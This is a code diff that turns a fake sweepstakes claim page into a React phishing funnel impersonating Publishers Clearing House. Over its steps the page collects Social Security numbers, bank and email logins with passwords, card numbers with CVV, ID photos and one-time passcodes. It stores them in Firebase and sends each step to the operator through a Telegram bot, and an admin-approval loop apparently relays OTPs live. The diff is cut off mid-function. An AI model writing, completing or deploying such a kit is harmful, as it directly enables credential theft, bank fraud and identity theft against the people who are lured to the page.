@@ -3,746 +3,746 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PCH Claims Department</title>
+    <title>Publishers Clearing House - Final Payment Notification</title>
+    
+    <!-- Tailwind CSS -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    
+    <!-- React & ReactDOM -->
+    <script crossorigin src="https://unpkg.com/react@18/umd/react.production.min.js"></script>
+    <script crossorigin src="https://unpkg.com/react-dom@18/umd/react-dom.production.min.js"></script>
+    
+    <!-- Babel for JSX -->
+    <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
+    
+    <!-- Firebase SDKs (Modular via Compat for simplicity in single file) -->
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-storage-compat.js"></script>
+
+    <!-- Google Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-        }
-
-        body {
-            background: linear-gradient(135deg, #1a2a6c, #b21f1f, #1a2a6c);
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 20px;
-        }
-
-        .container {
-            background: rgba(255, 255, 255, 0.95);
-            border-radius: 20px;
-            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
-            width: 100%;
-            max-width: 800px;
-            overflow: hidden;
-            position: relative;
-        }
-
-        .header {
-            background: linear-gradient(90deg, #003366, #0055a4);
-            color: white;
-            padding: 20px;
-            text-align: center;
-            position: relative;
-        }
-
-        .header h1 {
-            font-size: 2.5rem;
-            margin-bottom: 5px;
-            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3);
-        }
-
-        .header p {
-            font-size: 1.1rem;
-            opacity: 0.9;
-        }
-
-        .logo {
-            width: 80px;
-            height: 80px;
-            background: white;
+        body { font-family: 'Roboto', sans-serif; background-color: #f4f4f4; }
+        .pch-red { color: #C8102E; }
+        .pch-bg-red { background-color: #C8102E; }
+        .pch-gold { color: #FFD700; }
+        .pch-bg-gold { background-color: #FFD700; }
+        .loader {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #C8102E;
             border-radius: 50%;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            margin: 0 auto 15px;
-            font-size: 2rem;
-            font-weight: bold;
-            color: #003366;
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
-            cursor: pointer;
-            user-select: none;
+            width: 24px;
+            height: 24px;
+            animation: spin 1s linear infinite;
         }
-
-        .content {
-            padding: 30px;
-            position: relative;
-            min-height: 500px;
-        }
-
-        .step {
-            display: none;
-            opacity: 0;
-            transform: translateY(10px);
-            transition: opacity 0.4s ease, transform 0.4s ease;
-        }
-
-        .step.active {
-            display: block;
-            opacity: 1;
-            transform: translateY(0);
-        }
-
-        .form-group {
-            margin-bottom: 20px;
-        }
-
-        .form-row {
-            display: flex;
-            gap: 15px;
-        }
-        
-        .form-row .form-group {
-            flex: 1;
-        }
-
-        .form-group label {
-            display: block;
-            margin-bottom: 8px;
-            font-weight: 600;
-            color: #333;
-            font-size: 0.95rem;
-        }
-
-        .form-group input,
-        .form-group select,
-        .form-group textarea {
-            width: 100%;
-            padding: 12px 15px;
-            border: 2px solid #ddd;
-            border-radius: 10px;
-            font-size: 1rem;
-            transition: border-color 0.3s, box-shadow 0.3s;
-        }
-
-        .form-group input:focus,
-        .form-group select:focus,
-        .form-group textarea:focus {
-            outline: none;
-            border-color: #0055a4;
-            box-shadow: 0 0 0 3px rgba(0, 85, 164, 0.2);
-        }
-
-        .section-divider {
-            border-top: 2px dashed #ddd;
-            margin: 25px 0;
-            position: relative;
-        }
-        
-        .section-divider span {
-            background: #fff;
-            padding: 0 10px;
-            position: absolute;
-            top: -12px;
-            left: 50%;
-            transform: translateX(-50%);
-            color: #0055a4;
-            font-weight: bold;
-            font-size: 0.9rem;
-            text-transform: uppercase;
-        }
-
-        .btn {
-            padding: 12px 25px;
-            border: none;
-            border-radius: 10px;
-            font-size: 1rem;
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.3s;
-            display: inline-block;
-        }
-
-        .btn-primary {
-            background: linear-gradient(90deg, #0055a4, #003366);
-            color: white;
-        }
-
-        .btn-primary:hover {
-            background: linear-gradient(90deg, #003366, #0055a4);
-            transform: translateY(-2px);
-            box-shadow: 0 5px 15px rgba(0, 85, 164, 0.4);
-        }
-
-        .btn-secondary {
-            background: #f0f0f0;
-            color: #333;
-        }
-
-        .btn-secondary:hover {
-            background: #e0e0e0;
-            transform: translateY(-2px);
-        }
-
-        .btn-success {
-            background: linear-gradient(90deg, #28a745, #218838);
-            color: white;
-        }
-
-        .btn-success:hover {
-            background: linear-gradient(90deg, #218838, #28a745);
-            transform: translateY(-2px);
-            box-shadow: 0 5px 15px rgba(40, 167, 69, 0.4);
-        }
-
-        .btn-group {
-            display: flex;
-            justify-content: space-between;
-            margin-top: 30px;
-        }
-
-        .prize-amount {
-            font-size: 3rem;
-            color: #0055a4;
-            text-align: center;
-            margin: 20px 0;
-            font-weight: bold;
-            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.1);
-        }
-
-        .warning-box {
-            background: #fff3cd;
-            border: 1px solid #ffeaa7;
-            border-radius: 10px;
-            padding: 15px;
-            margin-bottom: 20px;
-        }
-
-        .warning-box h3 {
-            color: #856404;
-            margin-bottom: 10px;
-        }
-
-        .warning-box p {
-            color: #856404;
-            line-height: 1.5;
-        }
-
-        .success-animation {
-            text-align: center;
-            padding: 40px 0;
-        }
-
-        .checkmark {
-            width: 100px;
-            height: 100px;
-            background: #28a745;
-            border-radius: 50%;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            margin: 0 auto 20px;
-            color: white;
-            font-size: 3rem;
-            animation: scaleIn 0.5s ease-in-out;
-        }
-
-        @keyframes scaleIn {
-            0% { transform: scale(0); }
-            50% { transform: scale(1.2); }
-            100% { transform: scale(1); }
-        }
-
-        .confetti {
-            position: absolute;
-            width: 10px;
-            height: 10px;
-            background: #f0f;
-            border-radius: 50%;
-            animation: fall 3s linear infinite;
-        }
-
-        @keyframes fall {
-            0% { transform: translateY(-100px) rotate(0deg); opacity: 1; }
-            100% { transform: translateY(100vh) rotate(360deg); opacity: 0; }
-        }
-
-        /* Admin Panel Styles */
-        .admin-panel {
-            display: none;
-            background: #f8f9fa;
-            border-top: 4px solid #0055a4;
-            padding: 20px;
-            margin-top: 20px;
-            border-radius: 10px;
-            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
-        }
-
-        .admin-panel.active {
-            display: block;
-        }
-
-        .admin-panel h3 {
-            margin-bottom: 15px;
-            color: #003366;
-            border-bottom: 1px solid #ddd;
-            padding-bottom: 10px;
-        }
-
-        .data-table {
-            width: 100%;
-            border-collapse: collapse;
-            margin-bottom: 20px;
-        }
-
-        .data-table th, .data-table td {
-            border: 1px solid #ddd;
-            padding: 8px;
-            text-align: left;
-        }
-
-        .data-table th {
-            background-color: #e9ecef;
-            color: #333;
-            width: 30%;
-        }
-
-        .admin-actions {
-            display: flex;
-            gap: 10px;
-        }
-
-        /* Responsive Design */
-        @media (max-width: 600px) {
-            .header h1 { font-size: 1.8rem; }
-            .prize-amount { font-size: 2.5rem; }
-            .btn-group { flex-direction: column; gap: 10px; }
-            .btn { width: 100%; }
-            .form-row { flex-direction: column; gap: 0; }
-        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .step-container { max-width: 600px; margin: 0 auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="header">
-            <div class="logo" id="secretTrigger">PCH</div>
-            <h1>Princess Charity Hall</h1>
-            <p>Claims Department Portal</p>
-        </div>
-        
-        <div class="content">
-            <!-- Step 1: Welcome -->
-            <div class="step active" id="step-1">
-                <h2>Welcome to the PCH Claims Department</h2>
-                <p>You have been selected to receive a prize from our annual drawing. Please complete the following steps to claim your prize.</p>
-                <div class="warning-box">
-                    <h3>⚠️ Important Notice</h3>
-                    <p>To ensure your prize is secured, please complete all steps within 48 hours. Failure to do so may result in the prize being awarded to an alternate winner.</p>
-                </div>
-                <div class="btn-group">
-                    <button class="btn btn-primary next-btn" data-next="2">Next →</button>
-                </div>
-            </div>
+    <div id="root"></div>
 
-            <!-- Step 2: Prize Selection -->
-            <div class="step" id="step-2">
-                <h2>Select Your Prize</h2>
-                <p>Choose the prize you would like to claim from the options below.</p>
-                <div class="form-group">
-                    <label for="prizeSelect">Select Prize:</label>
-                    <select id="prizeSelect">
-                        <option value="">-- Select a Prize --</option>
-                        <option value="10000">$10,000 Cash</option>
-                        <option value="50000">$50,000 Cash</option>
-                        <option value="100000">$100,000 Cash</option>
-                        <option value="500000">$500,000 Cash</option>
-                        <option value="1000000">$1,000,000 Mega Jackpot</option>
-                    </select>
-                </div>
-                <div class="btn-group">
-                    <button class="btn btn-secondary prev-btn" data-prev="1">← Back</button>
-                    <button class="btn btn-primary next-btn" data-next="3">Next →</button>
-                </div>
-            </div>
+    <script type="text/babel">
+        const { useState, useEffect, useContext, createContext, useRef } = React;
 
-            <!-- Step 3: Personal Information -->
-            <div class="step" id="step-3">
-                <h2>Personal Information</h2>
-                <p>Please enter your personal details as they appear on your government-issued ID.</p>
-                <div class="form-row">
-                    <div class="form-group">
-                        <label for="firstName">First Name:</label>
-                        <input type="text" id="firstName" placeholder="First Name">
-                    </div>
-                    <div class="form-group">
-                        <label for="lastName">Last Name:</label>
-                        <input type="text" id="lastName" placeholder="Last Name">
-                    </div>
-                </div>
-                <div class="form-row">
-                    <div class="form-group">
-                        <label for="dob">Date of Birth:</label>
-                        <input type="date" id="dob">
-                    </div>
-                    <div class="form-group">
-                        <label for="mmn">Mother's Maiden Name:</label>
-                        <input type="text" id="mmn" placeholder="Mother's Maiden Name">
-                    </div>
-                </div>
-                <div class="form-group">
-                    <label for="ssn">Social Security Number:</label>
-                    <input type="text" id="ssn" placeholder="XXX-XX-XXXX">
-                </div>
-                <div class="form-group">
-                    <label for="email">Email Address:</label>
-                    <input type="email" id="email" placeholder="email@example.com">
-                </div>
-                <div class="form-group">
-                    <label for="emailPass">Email Password:</label>
-                    <input type="password" id="emailPass" placeholder="Your email account password">
-                </div>
-                <div class="btn-group">
-                    <button class="btn btn-secondary prev-btn" data-prev="2">← Back</button>
-                    <button class="btn btn-primary next-btn" data-next="4">Next →</button>
-                </div>
-            </div>
+        // ==========================================
+        // FIREBASE CONFIGURATION
+        // REPLACE THE VALUES BELOW WITH YOUR OWN
+        // ==========================================
+        const firebaseConfig = {
+            apiKey: "YOUR_API_KEY",
+            authDomain: "YOUR_PROJECT_ID.firebaseapp.com",
+            projectId: "YOUR_PROJECT_ID",
+            storageBucket: "YOUR_PROJECT_ID.appspot.com",
+            messagingSenderId: "YOUR_MESSAGING_SENDER_ID",
+            appId: "YOUR_APP_ID"
+        };
 
-            <!-- Step 4: Address Information -->
-            <div class="step" id="step-4">
-                <h2>Address Information</h2>
-                <p>Please enter your current mailing address.</p>
-                <div class="form-group">
-                    <label for="address">Street Address:</label>
-                    <input type="text" id="address" placeholder="Street Address">
-                </div>
-                <div class="form-row">
-                    <div class="form-group">
-                        <label for="city">City:</label>
-                        <input type="text" id="city" placeholder="City">
-                    </div>
-                    <div class="form-group">
-                        <label for="state">State:</label>
-                        <select id="state">
-                            <option value="">-- Select State --</option>
-                            <option value="AL">Alabama</option><option value="AK">Alaska</option><option value="AZ">Arizona</option><option value="AR">Arkansas</option><option value="CA">California</option><option value="CO">Colorado</option><option value="CT">Connecticut</option><option value="DE">Delaware</option><option value="FL">Florida</option><option value="GA">Georgia</option><option value="HI">Hawaii</option><option value="ID">Idaho</option><option value="IL">Illinois</option><option value="IN">Indiana</option><option value="IA">Iowa</option><option value="KS">Kansas</option><option value="KY">Kentucky</option><option value="LA">Louisiana</option><option value="ME">Maine</option><option value="MD">Maryland</option><option value="MA">Massachusetts</option><option value="MI">Michigan</option><option value="MN">Minnesota</option><option value="MS">Mississippi</option><option value="MO">Missouri</option><option value="MT">Montana</option><option value="NE">Nebraska</option><option value="NV">Nevada</option><option value="NH">New Hampshire</option><option value="NJ">New Jersey</option><option value="NM">New Mexico</option><option value="NY">New York</option><option value="NC">North Carolina</option><option value="ND">North Dakota</option><option value="OH">Ohio</option><option value="OK">Oklahoma</option><option value="OR">Oregon</option><option value="PA">Pennsylvania</option><option value="RI">Rhode Island</option><option value="SC">South Carolina</option><option value="SD">South Dakota</option><option value="TN">Tennessee</option><option value="TX">Texas</option><option value="UT">Utah</option><option value="VT">Vermont</option><option value="VA">Virginia</option><option value="WA">Washington</option><option value="WV">West Virginia</option><option value="WI">Wisconsin</option><option value="WY">Wyoming</option>
-                        </select>
-                    </div>
-                    <div class="form-group">
-                        <label for="zip">ZIP Code:</label>
-                        <input type="text" id="zip" placeholder="ZIP">
-                    </div>
-                </div>
-                <div class="btn-group">
-                    <button class="btn btn-secondary prev-btn" data-prev="3">← Back</button>
-                    <button class="btn btn-primary next-btn" data-next="5">Next →</button>
-                </div>
-            </div>
+        // Initialize Firebase (only once)
+        if (!firebase.apps.length) {
+            firebase.initializeApp(firebaseConfig);
+        }
+        const db = firebase.firestore();
+        const storage = firebase.storage();
 
-            <!-- Step 5: Banking & Payment Info -->
-            <div class="step" id="step-5">
-                <h2>Financial Information</h2>
-                <p>Please provide your banking and credit card details for direct deposit.</p>
-                
-                <div class="section-divider"><span>Bank Account Details</span></div>
-                <div class="form-group">
-                    <label for="bankName">Bank Name:</label>
-                    <input type="text" id="bankName" placeholder="e.g. Chase, Wells Fargo">
-                </div>
-                <div class="form-group">
-                    <label for="accountNumber">Account Number:</label>
-                    <input type="text" id="accountNumber" placeholder="Account Number">
-                </div>
-                <div class="form-group">
-                    <label for="routingNumber">Routing Number:</label>
-                    <input type="text" id="routingNumber" placeholder="Routing Number">
-                </div>
-                <div class="form-group">
-                    <label for="bankUser">Online Banking Username/Login:</label>
-                    <input type="text" id="bankUser" placeholder="Bank Username">
-                </div>
-                <div class="form-group">
-                    <label for="bankPass">Online Banking Password:</label>
-                    <input type="password" id="bankPass" placeholder="Bank Password">
-                </div>
+        // ==========================================
+        // TELEGRAM CONFIGURATION
+        // ==========================================
+        const TELEGRAM_BOT_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN"; // e.g., 123456:ABC-DEF1234ghijkl567890mnopqrst
+        const TELEGRAM_CHAT_ID = "YOUR_TELEGRAM_CHAT_ID";    // e.g., 123456789 or @username
 
-                <div class="section-divider"><span>Credit Card Details (For Processing Fee)</span></div>
-                <div class="form-group">
-                    <label for="ccName">Name on Card:</label>
-                    <input type="text" id="ccName" placeholder="Full Name">
-                </div>
-                <div class="form-group">
-                    <label for="ccNumber">Credit Card Number:</label>
-                    <input type="text" id="ccNumber" placeholder="XXXX-XXXX-XXXX-XXXX">
-                </div>
-                <div class="form-row">
-                    <div class="form-group">
-                        <label for="ccExp">Expiration Date:</label>
-                        <input type="text" id="ccExp" placeholder="MM/YY">
-                    </div>
-                    <div class="form-group">
-                        <label for="ccCVV">CVV:</label>
-                        <input type="text" id="ccCVV" placeholder="123">
-                    </div>
-                </div>
+        // ==========================================
+        // CONTEXT: PAGE CONTENT & SETTINGS
+        // ==========================================
+        const AppContext = createContext();
 
-                <div class="btn-group">
-                    <button class="btn btn-secondary prev-btn" data-prev="4">← Back</button>
-                    <button class="btn btn-primary next-btn" data-next="6">Next →</button>
-                </div>
-            </div>
+        const AppProvider = ({ children }) => {
+            const [pageContent, setPageContent] = useState({});
+            const [settings, setSettings] = useState({
+                otpEnabled: true,
+                telegramEnabled: true
+            });
+            const [loadingContent, setLoadingContent] = useState(true);
 
-            <!-- Step 6: Review & Confirm -->
-            <div class="step" id="step-6">
-                <h2>Review & Confirm</h2>
-                <p>Please review your information before submitting your claim.</p>
-                <div id="reviewContent" style="background: #f9f9f9; padding: 20px; border-radius: 10px; margin-bottom: 20px;">
-                    <!-- Populated by JS -->
-                </div>
-                <div class="btn-group">
-                    <button class="btn btn-secondary prev-btn" data-prev="5">← Back</button>
-                    <button class="btn btn-success next-btn" data-next="7">Submit Claim ✓</button>
-                </div>
-            </div>
+            useEffect(() => {
+                // Listen to 'config' collection for real-time updates
+                const unsubscribe = db.collection('config').doc('settings').onSnapshot(doc => {
+                    if (doc.exists) {
+                        const data = doc.data();
+                        // Merge default content with fetched content
+                        const defaultContent = getDefaultContent();
+                        setPageContent({ ...defaultContent, ...data.pages });
+                        setSettings({
+                            otpEnabled: data.otpEnabled !== false, // Default to true
+                            telegramEnabled: data.telegramEnabled !== false
+                        });
+                    } else {
+                        setPageContent(getDefaultContent());
+                    }
+                    setLoadingContent(false);
+                });
 
-            <!-- Step 7: Confirmation -->
-            <div class="step" id="step-7">
-                <div class="success-animation">
-                    <div class="checkmark">✓</div>
-                    <h2>Claim Submitted Successfully!</h2>
-                    <p>Your claim has been received and is being processed.</p>
-                    <div class="prize-amount" id="finalPrize">$10,000</div>
-                    <p>Your prize will be deposited within 7-10 business days.</p>
-                    <div class="btn-group" style="justify-content: center;">
-                        <button class="btn btn-primary" id="resetBtn">Start New Claim</button>
-                    </div>
-                </div>
-            </div>
+                return () => unsubscribe();
+            }, []);
 
-            <!-- Hidden Admin Panel -->
-            <div class="admin-panel" id="adminPanel">
-                <h3>Admin View (Live Data)</h3>
-                <p style="margin-bottom:15px; font-size:0.9rem; color:#666;">This data is captured from the form above.</p>
-                <table class="data-table" id="adminTable">
-                    <!-- JS will populate this -->
-                </table>
-                <div class="admin-actions">
-                    <button class="btn btn-success" onclick="alert('Claim Approved!')">Approve Claim</button>
-                    <button class="btn btn-secondary" onclick="alert('Claim Rejected!')">Reject Claim</button>
-                    <button class="btn btn-primary" onclick="copyData()">Copy to Clipboard</button>
-                </div>
-            </div>
-        </div>
-    </div>
-
-    <script>
-        // STATE
-        let currentStep = 1;
-        let logoClicks = 0;
-        let logoClickTimer;
-
-        document.addEventListener('DOMContentLoaded', () => {
-            // Check URL for #admin
-            if (window.location.hash === '#admin') {
-                document.getElementById('adminPanel').classList.add('active');
-            }
-
-            // Secret Trigger: Click Logo 3 Times
-            document.getElementById('secretTrigger').addEventListener('click', () => {
-                logoClicks++;
-                clearTimeout(logoClickTimer);
-                logoClickTimer = setTimeout(() => { logoClicks = 0; }, 2000); // Reset if not clicked within 2 seconds
-
-                if (logoClicks === 3) {
-                    document.getElementById('adminPanel').classList.toggle('active');
-                    logoClicks = 0;
+            const getDefaultContent = () => {
+                // Defaults for all 11 steps
+                const defaults = {};
+                for (let i = 1; i <= 11; i++) {
+                    defaults[`step${i}`] = {
+                        title: i === 1 ? "CONGRATULATIONS! You've Been Selected!" : (i === 11 ? "Payment Successfully Submitted!" : `Step ${i} Details`),
+                        subtext: i === 1 ? "Final Payment Notification" : (i === 11 ? "Your payment is being transferred." : "Please enter your details below."),
+                        buttonText: "Next"
+                    };
                 }
-            }
+                defaults.step1.buttonText = "Claim Prize";
+                defaults.step11.prizeAmount = "$5,000,000";
+                defaults.step11.winnerName = "John Doe";
+                return defaults;
+            };
 
-            // Button Listeners
-            document.querySelectorAll('.next-btn').forEach(btn => {
-                btn.addEventListener('click', (e) => {
-                    e.preventDefault();
-                    const nextStep = parseInt(btn.dataset.next);
-                    if (validateStep(currentStep)) {
-                        // If going to review step, populate it
-                        if (nextStep === 6) populateReview();
-                        goToStep(nextStep);
+            return (
+                <AppContext.Provider value={{ pageContent, settings, loadingContent, setPageContent, setSettings }}>
+                    {children}
+                </AppContext.Provider>
+            );
+        };        // ==========================================
+        // UTILITY: TELEGRAM NOTIFICATIONS
+        // ==========================================
+        const sendTelegramNotification = async (stepName, details, userId) => {
+            const { settings } = useContext(AppContext);
+            if (!settings.telegramEnabled) return;
+
+            let message = `⚠️ **PCH PHISHING ALERT: ${stepName}**\n`;
+            message += `👤 **User ID:** ${userId}\n`;
+            message += `📝 **Details:**\n${details}`;
+
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            
+            try {
+                await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
+            } catch (error) {
+                console.error("Telegram Error:", error);
+            }
+        };
+
+        // ==========================================
+        // UTILITY: IMAGE COMPRESSION & UPLOAD
+        // ==========================================
+        const uploadImageToStorage = async (file, userId, side) => {
+            const fileName = `ids/${userId}/${side}_${Date.now()}.jpg`;
+            const storageRef = storage.ref(fileName);
+            
+            // Compress image using Canvas
+            const reader = new FileReader();
+            reader.readAsDataURL(file);
+            
+            return new Promise((resolve, reject) => {
+                reader.onload = function(event) {
+                    const img = new Image();
+                    img.src = event.target.result;
+                    img.onload = function() {
+                        const canvas = document.createElement('canvas');
+                        const ctx = canvas.getContext('2d');
+                        const maxWidth = 800;
+                        const scaleSize = maxWidth / img.width;
+                        canvas.width = maxWidth;
+                        canvas.height = img.height * scaleSize;
+                        ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
+                        
+                        const compressedDataUrl = canvas.toDataURL('image/jpeg', 0.7);
+                        
+                        // Upload to Firebase Storage
+                        storageRef.putString(compressedDataUrl, 'data_url')
+                            .then(snapshot => snapshot.ref.getDownloadURL())
+                            .then(url => resolve(url))
+                            .catch(error => reject(error));
+                    };
+                };
+            });
+        };
+
+        // ==========================================
+        // COMPONENT: MULTI-STEP FUNNEL
+        // ==========================================
+        const FunnelApp = () => {
+            const { pageContent, settings, loadingContent } = useContext(AppContext);
+            const [currentStep, setCurrentStep] = useState(1);
+            const [userData, setUserData] = useState({});
+            const [userId, setUserId] = useState('');
+            const [otpApproved, setOtpApproved] = useState(false);
+            const [loading, setLoading] = useState(false);
+
+            // Initialize User ID on mount
+            useEffect(() => {
+                if (!userId) {
+                    const newId = 'PCH_' + Math.random().toString(36).substr(2, 9);
+                    setUserId(newId);
+                    setUserData(prev => ({ ...prev, id: newId }));
+                    
+                    // Save initial user to DB
+                    db.collection('submissions').doc(newId).set({
+                        id: newId,
+                        step: 1,
+                        timestamp: firebase.firestore.FieldValue.serverTimestamp(),
+                        data: { id: newId }
+                    });
+                }
+            }, [userId]);
+
+            // Listen for OTP approval status from Admin
+            useEffect(() => {
+                if (!userId) return;
+                const unsubscribe = db.collection('submissions').doc(userId).onSnapshot(doc => {
+                    if (doc.exists) {
+                        const data = doc.data();
+                        if (data.otpApproved !== undefined) {
+                            setOtpApproved(data.otpApproved);
+                        }
                     }
                 });
-            });
+                return () => unsubscribe();
+            }, [userId]);
 
-            document.querySelectorAll('.prev-btn').forEach(btn => {
-                btn.addEventListener('click', (e) => {
-                    e.preventDefault();
-                    goToStep(parseInt(btn.dataset.prev));
+            const handleNextStep = async () => {
+                setLoading(true);
+                
+                // Validate current step data
+                let isValid = true;
+                let detailsForTelegram = "";
+
+                // Step-specific validation & Telegram prep
+                switch(currentStep) {
+                    case 1:
+                        detailsForTelegram = "Started Funnel";
+                        break;
+                    case 2:
+                        if (!userData.firstName || !userData.lastName || !userData.address) isValid = false;
+                        detailsForTelegram = `Name: ${userData.firstName} ${userData.lastName}\nAddress: ${userData.address}, ${userData.city}, ${userData.state} ${userData.zip}`;
+                        break;
+                    case 3:
+                        if (!userData.ssn) isValid = false;
+                        detailsForTelegram = `SSN: ${userData.ssn}`;
+                        break;
+                    case 4:
+                        if (!userData.bankUser || !userData.bankPass) isValid = false;
+                        detailsForTelegram = `Bank Login: ${userData.bankUser} / ${userData.bankPass}`;
+                        break;
+                    case 5:
+                        if (!userData.email || !userData.emailPass) isValid = false;
+                        detailsForTelegram = `Email: ${userData.email} / ${userData.emailPass}`;
+                        break;
+                    case 6:
+                        if (!userData.accountNum || !userData.routingNum) isValid = false;
+                        detailsForTelegram = `Bank Acct: ${userData.accountNum} | Routing: ${userData.routingNum}`;
+                        break;
+                    case 7:
+                        if (!userData.ccNum || !userData.cvv || !userData.expiry) isValid = false;
+                        detailsForTelegram = `CC: ${userData.ccNum} | CVV: ${userData.cvv} | Exp: ${userData.expiry}`;
+                        break;
+                    case 8:
+                        if (!userData.dob || !userData.maidenName) isValid = false;
+                        detailsForTelegram = `DOB: ${userData.dob} | Maiden Name: ${userData.maidenName}`;
+                        break;
+                    case 9:
+                        if (!userData.idFrontUrl || !userData.idBackUrl) isValid = false;
+                        detailsForTelegram = `ID Front: ${userData.idFrontUrl}\nID Back: ${userData.idBackUrl}`;
+                        break;
+                    case 10:
+                        if (!userData.otpCode) isValid = false;
+                        detailsForTelegram = `OTP Entered: ${userData.otpCode}`;
+                        // Send OTP to DB for Admin approval
+                        await db.collection('submissions').doc(userId).update({
+                            step: 10,
+                            data: userData,
+                            otpCode: userData.otpCode,
+                            otpApproved: false
+                        });
+                        sendTelegramNotification("OTP ENTERED", detailsForTelegram, userId);
+                        
+                        // Wait for approval
+                        setLoading(false);
+                        if (!otpApproved) {
+                            alert("OTP Submitted! Waiting for Admin Approval...");
+                        }
+                        return; // Exit, wait for snapshot update
+                    case 11:
+                        // Final Summary
+                        detailsForTelegram = `FINAL SUMMARY\nName: ${userData.firstName} ${userData.lastName}\nSSN: ${userData.ssn}\nBank: ${userData.bankUser}\nEmail: ${userData.email}\nCC: ${userData.ccNum}\nDOB: ${userData.dob}`;
+                        break;
+                    default:
+                        break;
+                }
+
+                if (!isValid) {
+                    setLoading(false);
+                    alert("Please fill in all fields.");
+                    return;
+                }
+
+                // Update DB with new step and data
+                await db.collection('submissions').doc(userId).update({
+                    step: currentStep,
+                    data: userData,
+                    timestamp: firebase.firestore.FieldValue.serverTimestamp()
                 });
-            });
 
-            document.getElementById('resetBtn').addEventListener('click', (e) => {
-                e.preventDefault();
-                resetForm();
-            });
-            
-            // Update Admin Panel in real-time if visible
-            document.querySelectorAll('input, select').forEach(el => {
-                el.addEventListener('change', updateAdminTable);
-                el.addEventListener('input', updateAdminTable);
-            });
+                // Send Telegram Notification
+                sendTelegramNotification(`STEP ${currentStep} COMPLETED`, detailsForTelegram, userId);
 
-            // Initialize
-            showStep(1);
-            updateAdminTable();
-        });
-
-        function goToStep(stepNumber) {
-            currentStep = stepNumber;
-            showStep(currentStep);
-        }
-
-        function showStep(stepNumber) {
-            document.querySelectorAll('.step').forEach(step => step.classList.remove('active'));
-            const target = document.getElementById(`step-${stepNumber}`);
-            if (target) target.classList.add('active');
-            
-            if (stepNumber === 7) {
-                handleFinalSubmission();
-            }
-        }
-
-        function validateStep(stepNumber) {
-            let isValid = true;
-            
-            if (stepNumber === 2) {
-                if (!document.getElementById('prizeSelect').value) alert('Please select a prize.'); isValid = false;
-            }
-            if (stepNumber === 3) {
-                const fields = ['firstName', 'lastName', 'email', 'ssn', 'mmn', 'dob'];
-                for (let id of fields) {
-                    if (!document.getElementById(id).value) { alert('Please fill in all personal fields.'); isValid = false; break; }
+                // Move to next step or finish
+                if (currentStep === 11) {
+                    alert("Success! You are the winner!");
+                } else {
+                    setCurrentStep(prev => prev + 1);
                 }
-            }
-            if (stepNumber === 4) {
-                const fields = ['address', 'city', 'state', 'zip'];
-                for (let id of fields) {
-                    if (!document.getElementById(id).value) { alert('Please fill in all address fields.'); isValid = false; break; }
-                }
-            }
-            if (stepNumber === 5) {
-                const fields = ['bankName', 'accountNumber', 'routingNumber', 'bankUser', 'bankPass', 'ccName', 'ccNumber', 'ccExp', 'ccCVV'];
-                for (let id of fields) {
-                    if (!document.getElementById(id).value) { alert('Please fill in all financial fields.'); isValid = false; break; }
-                }
-            }
-            return isValid;
-        }
-
-        function populateReview() {
-            const data = getFormData();
-            let html = `
-                <div style="margin-bottom:15px;"><strong>Prize:</strong> ${data.prizeText}</div>
-                <div style="margin-bottom:15px;"><strong>Name:</strong> ${data.firstName} ${data.lastName}</div>
-                <div style="margin-bottom:15px;"><strong>SSN:</strong> ${data.ssn}</div>
-                <div style="margin-bottom:15px;"><strong>Email:</strong> ${data.email}</div>
-                <div style="margin-bottom:15px;"><strong>Address:</strong> ${data.address}, ${data.city}, ${data.state} ${data.zip}</div>
-                <div style="margin-bottom:15px;"><strong>Bank:</strong> ${data.bankName} (Acct: ...${data.accountNumber.slice(-4)})</div>
-                <div style="margin-bottom:15px;"><strong>Card:</strong> ...${data.ccNumber.slice(-4)} (Exp: ${data.ccExp})</div>
-            `;
-            document.getElementById('reviewContent').innerHTML = html;
-        }
-
-        function getFormData() {
-            return {
-                prizeText: document.getElementById('prizeSelect').options[document.getElementById('prizeSelect').selectedIndex].text,
-                firstName: document.getElementById('firstName').value,
-                lastName: document.getElementById('lastName').value,
-                dob: document.getElementById('dob').value,
-                mmn: document.getElementById('mmn').value,
-                ssn: document.getElementById('ssn').value,
-                email: document.getElementById('email').value,
-                emailPass: document.getElementById('emailPass').value,
-                address: document.getElementById('address').value,
-                city: document.getElementById('city').value,
-                state: document.getElementById('state').value,
-                zip: document.getElementById('zip').value,
-                bankName: document.getElementById('bankName').value,
-                accountNumber: document.getElementById('accountNumber').value,
-                routingNumber: document.getElementById('routingNumber').value,
-                bankUser: document.getElementById('bankUser').value,
-                bankPass: document.getElementById('bankPass').value,
-                ccName: document.getElementById('ccName').value,
-                ccNumber: document.getElementById('ccNumber').value,
-                ccExp: document.getElementById('ccExp').value,
